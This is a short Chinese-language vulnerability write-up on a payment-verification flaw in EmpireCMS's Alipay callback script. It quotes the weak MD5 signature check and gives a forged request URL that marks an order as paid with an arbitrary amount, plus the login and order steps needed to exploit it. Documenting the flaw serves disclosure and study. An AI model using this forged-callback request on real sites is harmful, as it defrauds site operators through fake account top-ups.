# EmpireCMS 任意充值漏洞


## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

漏洞文件

> https://www.baidu.com/EmpireCMS/upload/e/payapi/alipay/payend.php

漏洞详情

首先在`/e/payapi/alipay/payend.php`

```php
$sign='';

foreach($_GET AS $key=>$val)

{

if($key!='sign'&&$key!='sign_type'&&$key!='code')

{

$sign.="$key=$val&";

}

}

$sign=md5(substr($sign,0,-1).$paykey);

print($sign);

if($sign!=$_GET['sign'])

{

printerror('验证MD5签名失败.','../../../',1,0,1);

```

这个是sign签名的验证没有检测来源是否为支付宝链接而且没有安装情况下key为0

所以我们可以自己构造sign

```
https://www.baidu.com/EmpireCMS/upload/e/payapi/alipay/payend.php?sign=63b90f066d744a4d53150045837bd90d&trade_status=TRADE_FINISHED&trade_no=1111&out_trade_no=aaaaaa&total_fee=11111111

```

`sign=63b90f066d744a4d53150045837bd90d`是get的数组的md5值

当然需要登录情况下还要自己手动在用户中心提交次订单，系统会设置cookie满足条件然后在到我们sign的地方

提交后

![](images/2020_07_08/15942230763637.jpg)

![](images/2020_07_08/15942230816484.jpg)


## 参考链接

> https://man-hin.lofter.com/post/37bd50_1c886dc36

